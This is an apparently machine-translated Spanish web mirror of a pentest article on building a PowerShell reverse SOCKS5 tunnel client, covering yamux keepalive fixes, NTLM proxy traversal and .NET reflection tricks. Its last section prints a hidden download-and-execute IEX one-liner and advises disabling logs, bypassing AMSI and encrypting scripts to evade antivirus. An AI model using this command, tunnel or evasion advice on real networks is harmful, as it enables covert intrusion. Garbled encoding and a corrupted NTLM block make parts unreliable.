<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üêª ü§≤üèª üëµüèΩ Escribimos Reverse socks5 proxy en powershell. Parte 3 ü§ûüèΩ üë®üèΩ‚ÄçüöÄ üë©üèº‚Äçüî¨</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="La historia de la investigaci√≥n y el desarrollo en 3 partes. La parte 3 es pr√°ctica. 
 Hay muchas hayas, incluso m√°s beneficios 

 Los art√≠culos anter...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Escribimos Reverse socks5 proxy en powershell. Parte 3</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/454254/">  La historia de la investigaci√≥n y el desarrollo en 3 partes.  La parte 3 es pr√°ctica. <br>  Hay muchas hayas, incluso m√°s beneficios <br><br>  Los art√≠culos anteriores del ciclo se pueden encontrar <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> =) <br><br><h3>  Control de batalla </h3><br>  Probemos ahora el funcionamiento de nuestro script en la pr√°ctica.  Para hacer esto, intente lanzar el t√∫nel inverso desde la m√°quina virtual (Windows 7 .net 4.7) al Linux VPS en Digital Ocean y luego, us√°ndolo, volveremos a Win7.  En este caso, simulamos una situaci√≥n en la que Windows 7 es la m√°quina del Cliente, Linux VPS es nuestro servidor. <br><a name="habracut"></a><br>  En VPS (en nuestro caso, Ubuntu 18.04) instalamos y configuramos la parte del servidor de RsocksTun: <br><br><ul><li>  configura el golang: apt install golang </li><li>  tomar las fuentes de rsockstun de gita: <br>  git clone <a href="">github.com/mis-team/rsockstun.git</a> / opt / rstun </li><li>  instalar dependencias: <br>  ve a buscar github.com/hashicorp/yamux <br>  ve a buscar github.com/armon/go-socks5 <br>  vaya a obtener github.com/ThomsonReutersEikon/go-ntlm/ntlm </li><li>  compilar de acuerdo con el manual: cd / opt / rstun;  ir a construir </li><li>  generar certificado SSL: <br>  openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes </li><li>  comenzamos la parte del servidor: </li></ul><br><img src="https://habrastorage.org/webt/c6/rx/45/c6rx45gxq1qcabdtdvdczplgq8m.png"><br><br><ul><li>  Comenzamos nuestro script en el cliente, indic√°ndole el servidor para conectar, el puerto y la contrase√±a: </li></ul><br><img src="https://habrastorage.org/webt/f2/hz/ks/f2hzksob9ctx8qsvrt-p1ycg0fe.png"><br><br><ul><li>  use el puerto elevado del servidor Socks5 para ir a mail.ru </li></ul><br><img src="https://habrastorage.org/webt/fi/ye/lj/fiyeljrteulwjd0xfihggiovhsk.png"><br><br>  Como puede ver en las capturas de pantalla, nuestro script funciona.  Nos alegramos, mentalmente erigimos un monumento a nosotros mismos y decidimos que todo era perfecto.  Pero ... <br><br><h3>  Manejo de errores </h3><br>  Pero no todo es tan f√°cil como nos gustar√≠a ... <br><br>  Durante el funcionamiento del script, se descubri√≥ un momento desagradable: si el script funciona a trav√©s de una conexi√≥n no muy r√°pida con el servidor, el error que se muestra en la figura a continuaci√≥n puede ocurrir al transferir datos grandes <br><br><img src="https://habrastorage.org/webt/kb/sd/bn/kbsdbnzfegxlymwrz8bcygd7qeo.png"><br><br>  Despu√©s de estudiar este error, vemos que cuando recibimos un mensaje de keepalive (mientras los datos a√∫n se transmiten al servidor), intentamos escribir simult√°neamente una respuesta a keepalive en el socket, lo que causa un error. <br><br>  Para corregir la situaci√≥n, debemos esperar hasta que se complete la transferencia de datos y luego enviar una respuesta a keepalive.  Pero aqu√≠ puede surgir otro problema: si llega un mensaje de alerta en el momento entre el env√≠o de un encabezado de 12 bytes y el env√≠o de datos, destruiremos la estructura del paquete ymx.  Por lo tanto, una soluci√≥n m√°s correcta ser√≠a transferir toda la funcionalidad para enviar datos dentro de yamuxScript, que procesa eventos para enviar secuencialmente y no habr√° tales situaciones. <br><br>  Al mismo tiempo, para indicar a yamuxScript que env√≠e respuestas de respuesta activa, podemos usar nuestra ArrayList StopFlag compartida [0]: no se utiliza un √≠ndice cero, porque  la numeraci√≥n de las secuencias de yamux comienza con 1. En este √≠ndice, pasaremos en yamuxScript el valor de ping recibido en el mensaje de keepalive.  Por defecto, el valor ser√° -1, lo que significa que no se necesita transmisi√≥n.  YamuxScript verificar√° este valor, y si es 0 (el primer ping de keepalive = 0) o m√°s, entonces enviar√° el valor pasado a la respuesta de keepalive: <br><br><pre><code class="plaintext hljs">if ($StopFlag[0] -ge 0){ #got yamux keepalive. we have to reply $outbuf = [byte[]](0x00,0x02,0x00,0x02,0x00,0x00,0x00,0x00) + [bitconverter]::getbytes([int32]$StopFlag[0])[3..0] $state.tcpstream.Write($outbuf,0,12) $state.tcpstream.flush() $StopFlag[0] = -1 }</code> </pre> <br>  Tambi√©n deber√≠amos excluir el env√≠o en el hilo principal del programa de una respuesta al indicador SYN YMX. <br><br>  Para hacer esto, tambi√©n debemos transferir esta funcionalidad dentro de yamuxScript, pero dado que el servidor yamux no requiere enviar una respuesta a YMX SYN e inmediatamente comienza a enviar datos, simplemente apagamos el env√≠o de este paquete y eso es todo: <br><br><pre> <code class="plaintext hljs">#$outbuf = [byte[]](0x00,0x01,0x00,0x02,$ymxstream[3],$ymxstream[2],$ymxstream[1],$ymxstream[0],0x00,0x00,0x00,0x00) #$tcpstream.Write($outbuf,0,12)</code> </pre> <br>  Despu√©s de eso, la transferencia de grandes piezas de datos funciona bien. <br><br><h3>  Soporte de proxy </h3><br>  Ahora pensemos en c√≥mo podemos hacer que nuestro cliente trabaje a trav√©s de un servidor proxy. <br><br>  Comencemos con lo b√°sico.  En teor√≠a, el proxy http (es decir, los proxy http funcionan en la mayor√≠a de las redes corporativas) est√° dise√±ado para funcionar con el protocolo HTTP, y parece que http no huele como el nuestro.  Pero en la naturaleza, adem√°s de http, tambi√©n hay https y su navegador puede conectarse perfectamente a los sitios https a trav√©s de http regular, ¬øverdad? <br><br>  La raz√≥n de esto es el modo de operaci√≥n del servidor proxy especial: modo CONEXI√ìN.  Por lo tanto, si el navegador desea conectarse al servidor de Gmail a trav√©s de https a trav√©s de un servidor proxy, env√≠a una solicitud CONNECT al servidor proxy, que indica el host y el puerto de destino. <br><br><pre> <code class="plaintext hljs">CONNECT gmail.com:443 HTTP/1.1 Host: gmail.com:443 Proxy-Connection: Keep-Alive</code> </pre> <br>  Despu√©s de una conexi√≥n exitosa al servidor de gmail, el proxy devuelve una respuesta 200 OK. <br><br><pre> <code class="plaintext hljs">HTTP/1.1 200 OK</code> </pre> <br>  Despu√©s de eso, todos los datos del navegador se transmiten directamente al servidor y viceversa.  En t√©rminos simples, un proxy conecta directamente dos sockets de red entre s√≠: un socket de navegador y un socket de servidor de gmail.  Despu√©s de eso, el navegador comienza a establecer una conexi√≥n SSL con el servidor de Gmail y trabajar con √©l directamente. <br><br>  Al transferir lo anterior a nuestro cliente, primero debemos establecer una conexi√≥n con el servidor proxy, enviar un paquete http que indique el m√©todo CONNECT y la direcci√≥n de nuestro servidor yamux, esperar una respuesta con el c√≥digo 200 y luego proceder a establecer una conexi√≥n SSL. <br><br>  En principio, no hay nada particularmente complicado.  As√≠ es como se implementa el mecanismo de conexi√≥n a trav√©s del servidor proxy en el cliente de golang rsockstun. <br><br>  Las principales dificultades comienzan cuando el servidor proxy requiere autorizaci√≥n ntlm o kerberos cuando se conecta a s√≠ mismo. <br><br>  En este caso, el servidor proxy devuelve el c√≥digo 407 y el encabezado http ntlm como una cadena base64 <br><br><pre> <code class="plaintext hljs">HTTP/1.1 407 Proxy Authentication Required Proxy-Authenticate: NTLM TlRMTVNTUAACAAAAAAAAADgAAABVgphianXk2614u2AAAAAAAAAAAKIAogA4AAAABQEoCgAAAA8CAA4AUgBFAFUAVABFAFIAUwABABwAVQBLAEIAUAAtAEMAQgBUAFIATQBGAEUAMAA2AAQAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQAAwA0AHUAawBiAHAALQBjAGIAdAByAG0AZgBlADAANgAuAFIAZQB1AHQAZQByAHMALgBuAGUAdAAFABYAUgBlAHUAdABlAHIAcwAuAG4AZQB0AAAAAAA= Date: Tue, 28 May 2019 14:06:15 GMT Content-Length: 0</code> </pre> <br>  Para una autorizaci√≥n exitosa, debemos decodificar esta l√≠nea, eliminar par√°metros de ella (como ntlm-challenge, nombre de dominio).  Luego, utilizando estos datos, as√≠ como el nombre de usuario y su hash ntlm, debemos generar una respuesta ntlm, codificarla de nuevo a base64 y enviarla de vuelta al servidor proxy. <br><br><pre> <code class="plaintext hljs">CONNECT mail.com:443 HTTP/1.1 Host: mail.com:443 Proxy-Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHoAAAA6AToBkgAAAAwADABYAAAACAAIAGQAAAAOAA4AbAAAAAAAAADMAQAABYKIIgYBsR0AAAAPnHZSXCGeU7zoq64cDFENAGQAbwBtAGEAaQBuAHUAcwBlAHIAVQBTAEUAUgAtAFAAQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABuxncy1yDsSypAauO/N1TfAQEAAAAAAAAXKmWDXhXVAag3UE8RsOGCAAAAAAIADgBSAEUAVQBUAEUAUgBTAAEAHABVAEsAQgBQAC0AQwBCAFQAUgBNAEYARQAwADYABAAWAFIAZQB1AHQAZQByAHMALgBuAGUAdAADADQAdQBrAGIAcAAtAGMAYgB0AHIAbQBmAGUAMAA2AC4AUgBlAHUAdABlAHIAcwAuAG4AZQB0AAUAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQACAAwADAAAAAAAAAAAAAAAAAwAAA2+UpsHCJmpIGttOj1VN+5JbP1D1HvJsbPKpKyd63trQoAEAAAAAAAAAAAAAAAAAAAAAAACQAcAEgAVABUAFAALwAxADIANwAuADAALgAwAC4AMQAAAAAAAAAAAA== User-Agent: curl/7.64.1 Accept: */* Proxy-Connection: Keep-Alive</code> + + UpsHCJmpIGttOj1VN 5JbP1D1HvJsbPKpKyd63trQoAEAAAAAAAAAAAAAAAAAAAAAAACQAcAEgAVABUAFAALwAxADIANwAuADAALgAwAC4AMQAAAAAAAAAAAA == <code class="plaintext hljs">CONNECT mail.com:443 HTTP/1.1 Host: mail.com:443 Proxy-Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHoAAAA6AToBkgAAAAwADABYAAAACAAIAGQAAAAOAA4AbAAAAAAAAADMAQAABYKIIgYBsR0AAAAPnHZSXCGeU7zoq64cDFENAGQAbwBtAGEAaQBuAHUAcwBlAHIAVQBTAEUAUgAtAFAAQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABuxncy1yDsSypAauO/N1TfAQEAAAAAAAAXKmWDXhXVAag3UE8RsOGCAAAAAAIADgBSAEUAVQBUAEUAUgBTAAEAHABVAEsAQgBQAC0AQwBCAFQAUgBNAEYARQAwADYABAAWAFIAZQB1AHQAZQByAHMALgBuAGUAdAADADQAdQBrAGIAcAAtAGMAYgB0AHIAbQBmAGUAMAA2AC4AUgBlAHUAdABlAHIAcwAuAG4AZQB0AAUAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQACAAwADAAAAAAAAAAAAAAAAAwAAA2+UpsHCJmpIGttOj1VN+5JbP1D1HvJsbPKpKyd63trQoAEAAAAAAAAAAAAAAAAAAAAAAACQAcAEgAVABUAFAALwAxADIANwAuADAALgAwAC4AMQAAAAAAAAAAAA== User-Agent: curl/7.64.1 Accept: */* Proxy-Connection: Keep-Alive</code> </pre> <br>  Pero esto no es tan malo.  El hecho es que cuando ejecutamos el script, no sabemos ni el nombre del usuario actual ni su hash de contrase√±a ntlm.  Por lo tanto, para la autorizaci√≥n en el servidor proxy, necesitamos encontrar el nombre de usuario / contrase√±a desde otro lugar. <br><br>  Te√≥ricamente, podemos implementar esta funcionalidad en un script (comenzando por establecer los par√°metros de autenticaci√≥n manualmente, como se hace en el cliente GoLang, y terminando con el uso de un volcado de memoria del proceso LSASS, como se hace en mimikatz), pero luego nuestro script crecer√° a un tama√±o y complejidad incre√≠bles, especialmente que estos temas est√°n m√°s all√° del alcance de este art√≠culo. <br><br>  Pensamos y decidimos que ir√≠amos por el otro lado ... <br><br>  En lugar de hacer la autorizaci√≥n manualmente, utilizaremos la funcionalidad incorporada para trabajar con un servidor proxy de la clase HTTPWebRequest.  Pero en este caso, tendremos que cambiar el c√≥digo de nuestro servidor RsocksTun; despu√©s de todo, cuando recibe una solicitud del cliente, solo espera una l√≠nea con una contrase√±a, y recibir√° una solicitud HTTP completa.  En principio, modificar el lado del servidor de rsoskstun no es tan dif√≠cil.  Solo es necesario decidir en qu√© parte de la solicitud http transmitiremos la contrase√±a (por ejemplo, ser√° el encabezado http XAuth) e implementaremos la funcionalidad de procesar la solicitud http, verificar nuestro encabezado con una contrase√±a y enviar una respuesta http (200 OK).  Agregamos esta funcionalidad a una rama separada del proyecto RSocksTun. <br><br>  Despu√©s de modificar la parte de Golang de RSocksTun (servidor y cliente), comenzaremos a agregar la funcionalidad de trabajar con un servidor proxy a nuestro script.  El c√≥digo m√°s simple para la clase HttpWebRequest para conectarse a un servidor web a trav√©s de un proxy se ve as√≠: <br><br><pre> <code class="plaintext hljs">[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $request = [System.Net.HttpWebRequest]::Create("https://gmail.com:443") $request.Method = "GET" $request.Headers.Add("Xauth","password") $proxy = new-object system.net.webproxy('http://127.0.0.1:8080'); $proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials $request.Proxy = $proxy try {$serverResponse = $request.GetResponse()} catch {write-host "Can not connect"; exit}</code> </pre> <br>  En este caso, creamos una instancia de la clase HttpWebRequest, establecemos las propiedades de Proxy y Credenciales, agregamos el encabezado http XAuth personalizado.  En consecuencia, nuestra solicitud a los servidores de Google pasar√° por el servidor proxy 127.0.0.1:8080.  Si el proxy solicita autorizaci√≥n, el propio Windows "recoger√°" los cr√©ditos del usuario actual e insertar√° los encabezados http correspondientes. <br><br>  En lugar de especificar un servidor proxy manualmente, podemos usar la configuraci√≥n del sistema del servidor proxy: <br><br><pre> <code class="plaintext hljs">$proxy = [System.Net.WebRequest]::GetSystemWebProxy()</code> </pre> <br>  Entonces, despu√©s de conectarnos a trav√©s de un servidor proxy a nuestro servidor rsockstun y recibir una respuesta HTTP con el c√≥digo 200, necesitamos hacer un peque√±o truco, a saber, de la clase HTTPWebRequest, obtener un objeto de flujo para leer / escribir como $ tcpConnection.getStream ()  Hacemos esto a trav√©s del mecanismo de inspecci√≥n de reflexi√≥n .Net (para aquellos que quieran entender este mecanismo con m√°s detalle, compartan el <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">enlace</a> ).  Esto nos permite acceder a los m√©todos y propiedades de las clases subyacentes: <br><br><pre> <code class="plaintext hljs">#--------------------------------------------------------------------------------- # Reflection inspection to retrieve and reuse the underlying networkStream instance $responseStream = $serverResponse.GetResponseStream() $BindingFlags= [Reflection.BindingFlags] "NonPublic,Instance" $rsType = $responseStream.GetType() $connectionProperty = $rsType.GetProperty("Connection", $BindingFlags) $connection = $connectionProperty.GetValue($responseStream, $null) $connectionType = $connection.GetType() $networkStreamProperty = $connectionType.GetProperty("NetworkStream", $BindingFlags) $tcpStream = $networkStreamProperty.GetValue($connection, $null)</code> </pre> <br>  Por lo tanto, obtuvimos el mismo flujo de socket, que est√° conectado por el servidor proxy a nuestro servidor yamux y con el que podemos realizar operaciones de lectura / escritura. <br><br>  Otro punto que debemos considerar es el mecanismo para monitorear el estado de la conexi√≥n.  Dado que trabajamos a trav√©s del servidor proxy y la clase HTTPWebRequest, no tenemos la propiedad $ tcpConnection.Connected y necesitamos monitorear el estado de la conexi√≥n de alguna manera.  Podemos hacer esto a trav√©s de un indicador separado de $ conectado, se establece en $ true despu√©s de recibir el c√≥digo 200 del servidor proxy y se restablece a $ false cuando se produce una excepci√≥n al leer desde socket-stream: <br><br><pre> <code class="plaintext hljs">try { $num = $tcpStream.Read($tmpbuffer,0,12) } catch {$connected=$false; break;} if ($num -eq 0 ) {$connected=$false; break;}</code> </pre> <br>  De lo contrario, nuestro c√≥digo permanece sin cambios. <br><br><h3>  Lanzamiento en l√≠nea </h3><br>  Como regla general, todas las personas sensatas ejecutan secuencias de comandos similares desde archivos PS1, pero a veces (y de hecho, casi siempre) en el proceso de pentest / redtime se requiere ejecutar m√≥dulos desde la l√≠nea de comandos sin escribir nada en el disco, para no dejar rastros .  Adem√°s, powershell le permite hacer esto a trav√©s de la l√≠nea de comando: <br><br><pre> <code class="plaintext hljs">powershell.exe ‚Äìc &lt;powershell code&gt; powershell.exe ‚Äìe &lt;base64 powershell code&gt;</code> </pre> <br>  Sin embargo, uno no deber√≠a realmente relajarse en relaci√≥n con el secreto de iniciar y ejecutar comandos.  Porque, en primer lugar, todo el c√≥digo de PowerShell se registra utilizando herramientas est√°ndar de Windows en los registros de eventos correspondientes (Windows PowerShell y Microsoft-Windows-PowerShell / Operational), y en segundo lugar, todo el c√≥digo ejecutado dentro de PowerShell pasa por el mecanismo AMSI ( Interfaz de escaneo anti malware).  Otra cosa es que ambos mecanismos son perfectamente costosos con acciones sin complicaciones.  Desactivar revistas y omitir AMSI es un tema separado para el debate y lo escribiremos en futuros art√≠culos o en nuestro canal.  Pero ahora un poco sobre otra cosa. <br><br>  El hecho es que nuestro script ha crecido a tama√±os bastante impresionantes y est√° claro que no cabe en ninguna l√≠nea de comando (el l√≠mite de cmd en Windows es de 8191 caracteres).  Por lo tanto, necesitamos encontrar una forma de ejecutar nuestro script sin escribirlo en el disco.  Y aqu√≠ los m√©todos est√°ndar utilizados por el malware nos han estado ayudando durante casi 15 a√±os.  En resumen, la regla es simple: descargar y ejecutar.  Lo principal es no mezclarlo =) <br>  El comando de descarga y lanzamiento se ve as√≠: <br><br><pre> <code class="plaintext hljs">powershell.exe ‚Äìw hidden -c "IEX ((new-object net.webclient).downloadstring('http://url.com/script.ps1'))"</code> </pre> <br>  Puedes encontrar a√∫n m√°s opciones de lanzamiento en l√≠nea en el <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">HarmJ0y</a> 'I' s <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">git</a> : <br><br>  Por supuesto, antes de descargar debe cuidar de deshabilitar los registros y evitar o deshabilitar AMSI.  El script en s√≠ debe estar encriptado antes de la descarga, porque  durante el proceso de descarga, su antivirus (o no su =)) lo escanear√° de forma natural y, antes de comenzar, descifre seg√∫n corresponda.  C√≥mo hacer esto: usted, el lector, ya deber√≠a idearlo usted mismo.  Esto est√° m√°s all√° del alcance de este tema.  Pero conocemos a un especialista genial en este asunto: el todopoderoso Google.  Hay muchos ejemplos de cifrado y descifrado en la red, as√≠ como ejemplos de omitir AMSI. <br><br><h3>  Conclusi√≥n a todas las partes. </h3><br>  En el proceso, presentamos al lector la tecnolog√≠a de "t√∫neles inversos" y su uso para pentests, mostramos varios ejemplos de tales t√∫neles y hablamos sobre los pros y los contras de su uso. <br><br>  Tambi√©n logramos crear un cliente de PowerShell para el servidor RsocksTun con la capacidad: <br><br><ul><li>  Conexiones SSL </li><li>  autorizaci√≥n en el servidor; </li><li>  trabajar con yamux-server con soporte para pings keepalive; </li><li>  modo de operaci√≥n multihilo; </li><li>  Soporte de trabajo a trav√©s de un servidor proxy con autorizaci√≥n. </li></ul><br>  Puede encontrar todo el c√≥digo rsockstun (golang y powershell) en la rama correspondiente <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">en nuestro github.</a>  La rama maestra est√° dise√±ada para funcionar sin un servidor proxy, y la rama via_proxy est√° dise√±ada para funcionar a trav√©s de proxies y HTTP. <br><br>  Estaremos encantados de escuchar sus comentarios y sugerencias sobre c√≥mo mejorar el c√≥digo y la aplicabilidad del desarrollo en la pr√°ctica. <br><br>  Esto completa el ciclo de nuestros art√≠culos de t√∫nel inverso.  Realmente esperamos que est√© interesado en leernos y la informaci√≥n sea √∫til. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/454254/">https://habr.com/ru/post/454254/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../454240/index.html">An√°lisis de wavelet. Parte 3</a></li>
<li><a href="../454242/index.html">"Mira, ¬°qu√© jetpack tengo!" "¬°Ja, mira qu√© cohete tengo!" (notas del campeonato de cohetes)</a></li>
<li><a href="../454246/index.html">Variedades de coordenadas utilizadas en la GUI de Unity3d</a></li>
<li><a href="../454248/index.html">Siervos en la era de la inteligencia artificial</a></li>
<li><a href="../454252/index.html">Incluso los recursos web de organizaciones conocidas no est√°n protegidos de los errores de los ni√±os.</a></li>
<li><a href="../454256/index.html">¬øQu√© tiene de malo nuestra TI?</a></li>
<li><a href="../454260/index.html">Bad Code D√≠a del Ni√±o</a></li>
<li><a href="../454262/index.html">Por qu√© todo cient√≠fico de datos deber√≠a saber Dask</a></li>
<li><a href="../454264/index.html">4 canales de Youtube sensibles sobre entrevistas t√©cnicas</a></li>
<li><a href="../454266/index.html">Dell y Alienware en Computex 2019: habla sobre innovaciones clave</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>